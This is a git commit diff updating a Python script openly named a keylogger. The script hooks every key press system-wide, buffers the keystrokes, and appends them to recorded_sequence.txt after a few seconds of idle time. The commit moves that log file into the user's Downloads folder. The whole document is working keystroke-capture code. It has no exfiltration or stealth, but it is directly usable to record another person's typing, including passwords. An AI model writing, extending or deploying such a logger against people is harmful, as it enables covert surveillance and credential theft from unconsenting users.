a0b34d26f075f35a46f51d37e487aa8e5c89cd91
muratcx <muratmuratov05@gmail.com>
2023-10-02 05:48:42 -0400

    Update keylogger.py

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,9 +1,13 @@
 import keyboard
 import os
 import time
+from pathlib import Path  # Import the pathlib module
 
 # Define a list to store recorded keystrokes
 recorded_sequence = []
+
+# Define the path to the user's Downloads folder
+downloads_folder = str(Path.home() / "Downloads")
 
 # Function to process key events
 def on_key_event(e):
@@ -21,30 +25,30 @@ def on_key_event(e):
         recorded_sequence.append(key)
 
 # Function to save the recorded sequence to a file
-def save_recorded_sequence_to_file(file_name):
+def save_recorded_sequence_to_file(file_path):
     try:
-        with open(file_name, 'a') as file:  # Use 'a' for append mode
+        with open(file_path, 'a') as file:  # Use 'a' for append mode
             file.write("".join(recorded_sequence))
             file.write("\n")  # Add a newline to separate recordings
-        print(f"Recorded sequence saved to '{file_name}'")
+        print(f"Recorded sequence saved to '{file_path}'")
     except Exception as e:
         print(f"Error: {e}")
 
 # Function to save the recorded data and reset the sequence
-def save_and_clear_sequence(file_name):
+def save_and_clear_sequence(file_path):
     if len(recorded_sequence) > 0:
-        save_recorded_sequence_to_file(file_name)
+        save_recorded_sequence_to_file(file_path)
         recorded_sequence.clear()  # Clear the recorded data
 
 # Set the idle time threshold in seconds (adjust as needed)
-idle_time_threshold = 3 # 3 seconds of inactivity
+idle_time_threshold = 3  # 3 seconds of inactivity
 
 # Initialize the last activity time
 last_activity_time = time.time()
 
 try:
     print("Recording... Press 'esc' to stop and save.")
-    
+
     # Create a keyboard listener
     keyboard.on_press(on_key_event)
 
@@ -58,8 +62,7 @@ try:
         # Check for inactivity and save data if the threshold is reached
         current_time = time.time()
         if (current_time - last_activity_time) >= idle_time_threshold:
-            current_directory = os.getcwd()
-            file_name = os.path.join(current_directory, "recorded_sequence.txt")
+            file_name = os.path.join(downloads_folder, "recorded_sequence.txt")
             save_and_clear_sequence(file_name)
             last_activity_time = current_time  # Update last activity time
 
@@ -69,8 +72,7 @@ except KeyboardInterrupt:
     pass
 finally:
     # Ensure the recorded data is saved before exiting
-    current_directory = os.getcwd()
-    file_name = os.path.join(current_directory, "recorded_sequence.txt")
+    file_name = os.path.join(downloads_folder, "recorded_sequence.txt")
     save_and_clear_sequence(file_name)
 
     # Unhook all keyboard events
